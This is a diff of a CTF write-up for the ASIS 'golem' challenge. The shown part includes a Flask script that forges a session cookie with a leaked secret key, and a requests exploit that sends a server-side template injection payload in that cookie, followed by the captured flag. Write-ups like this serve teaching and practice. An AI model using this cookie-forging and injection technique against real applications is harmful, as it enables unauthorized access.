@@ -17,8 +17,7 @@ leaking that we can see that all parameters are kind of sanitized except token, 
 All I had to do is create local flask app, forge my token using the key which was in the python file with payload, and send it to the application<br><br>
 
 Payload : <br>
-```
-from flask import Flask, session
+```from flask import Flask, session
 
 app = Flask(__name__)
 
@@ -32,8 +31,7 @@ if __name__ == '__main__':
     app.secret_key = '7h15_5h0uld_b3_r34lly_53cur3d'
     app.run(host='127.0.0.1', port=2222, debug=True)```
     
-<br>
-and the exploit : <br>
+<br> and the exploit : <br>
 
 ```import requests
 
@@ -43,5 +41,6 @@ cookies={'session':'.eJwlyU0LgjAYAOC_Eu-5w9SCNugUOJl6iGgub21-QG4Z6Aab-N8zuj7PAv2
 r=requests.post('https://golem.asisctf.com/golem',cookies=cookies)
 
 print r.text```
+
 <br>
 Response contained flag : ASIS{I_L0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!}
